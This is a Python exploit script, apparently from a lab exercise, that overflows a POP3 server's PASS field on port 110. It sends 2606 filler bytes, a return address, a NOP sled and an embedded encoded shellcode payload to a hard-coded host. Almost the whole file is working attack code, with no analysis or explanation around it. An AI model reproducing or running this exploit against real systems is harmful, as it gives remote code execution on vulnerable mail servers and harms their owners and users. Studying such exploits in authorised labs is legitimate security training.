import socket
from struct import pack

ip = '10.0.0.7'
port = 110

# baddies = \x00\x0a\x0d

buf =  b""
buf += b"\xb8\x7d\x17\x9e\x1b\xda\xca\xd9\x74\x24\xf4\x5e"
buf += b"\x31\xc9\xb1\x52\x83\xc6\x04\x31\x46\x0e\x03\x3b"
buf += b"\x19\x7c\xee\x3f\xcd\x02\x11\xbf\x0e\x63\x9b\x5a"
buf += b"\x3f\xa3\xff\x2f\x10\x13\x8b\x7d\x9d\xd8\xd9\x95"
buf += b"\x16\xac\xf5\x9a\x9f\x1b\x20\x95\x20\x37\x10\xb4"
buf += b"\xa2\x4a\x45\x16\x9a\x84\x98\x57\xdb\xf9\x51\x05"
buf += b"\xb4\x76\xc7\xb9\xb1\xc3\xd4\x32\x89\xc2\x5c\xa7"
buf += b"\x5a\xe4\x4d\x76\xd0\xbf\x4d\x79\x35\xb4\xc7\x61"
buf += b"\x5a\xf1\x9e\x1a\xa8\x8d\x20\xca\xe0\x6e\x8e\x33"
buf += b"\xcd\x9c\xce\x74\xea\x7e\xa5\x8c\x08\x02\xbe\x4b"
buf += b"\x72\xd8\x4b\x4f\xd4\xab\xec\xab\xe4\x78\x6a\x38"
buf += b"\xea\x35\xf8\x66\xef\xc8\x2d\x1d\x0b\x40\xd0\xf1"
buf += b"\x9d\x12\xf7\xd5\xc6\xc1\x96\x4c\xa3\xa4\xa7\x8e"
buf += b"\x0c\x18\x02\xc5\xa1\x4d\x3f\x84\xad\xa2\x72\x36"
buf += b"\x2e\xad\x05\x45\x1c\x72\xbe\xc1\x2c\xfb\x18\x16"
buf += b"\x52\xd6\xdd\x88\xad\xd9\x1d\x81\x69\x8d\x4d\xb9"
buf += b"\x58\xae\x05\x39\x64\x7b\x89\x69\xca\xd4\x6a\xd9"
buf += b"\xaa\x84\x02\x33\x25\xfa\x33\x3c\xef\x93\xde\xc7"
buf += b"\x78\x96\x1e\xc7\x7e\xce\x1c\xc7\x6f\x52\xa8\x21"
buf += b"\xe5\x7a\xfc\xfa\x92\xe3\xa5\x70\x02\xeb\x73\xfd"
buf += b"\x04\x67\x70\x02\xca\x80\xfd\x10\xbb\x60\x48\x4a"
buf += b"\x6a\x7e\x66\xe2\xf0\xed\xed\xf2\x7f\x0e\xba\xa5"
buf += b"\x28\xe0\xb3\x23\xc5\x5b\x6a\x51\x14\x3d\x55\xd1"
buf += b"\xc3\xfe\x58\xd8\x86\xbb\x7e\xca\x5e\x43\x3b\xbe"
buf += b"\x0e\x12\x95\x68\xe9\xcc\x57\xc2\xa3\xa3\x31\x82"
buf += b"\x32\x88\x81\xd4\x3a\xc5\x77\x38\x8a\xb0\xc1\x47"
buf += b"\x23\x55\xc6\x30\x59\xc5\x29\xeb\xd9\xf5\x63\xb1"
buf += b"\x48\x9e\x2d\x20\xc9\xc3\xcd\x9f\x0e\xfa\x4d\x15"
buf += b"\xef\xf9\x4e\x5c\xea\x46\xc9\x8d\x86\xd7\xbc\xb1"
buf += b"\x35\xd7\x94"

# 5f4a358f
inputBuffer = b'A' * 2606
inputBuffer += pack('<L', (0x5f4a358f))
inputBuffer += b'\x90' * 16
inputBuffer += buf
inputBuffer += b'C' * (3500 - len(inputBuffer))

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.settimeout(5)

s.connect((ip,port))
s.recv(1024)

s.send(b'USER test\r\n')
s.recv(1024)

s.sendall(b'PASS ' + inputBuffer + b'\r\n')
print('[*] Payload sent!')

s.close()